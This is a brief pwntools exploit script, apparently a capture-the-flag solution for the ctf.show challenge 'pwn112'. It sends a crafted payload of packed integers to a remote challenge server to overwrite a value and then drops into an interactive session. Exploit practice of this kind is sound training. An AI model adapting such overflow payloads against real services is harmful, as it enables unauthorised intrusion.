from pwn import *
context.log_level='debug'
#io = process('./pwn112')
io = remote('pwn.challenge.ctf.show',28292)
payload = p32(1) *13 + p32(17)
io.recv()
io.sendline(payload)
io.interactive()
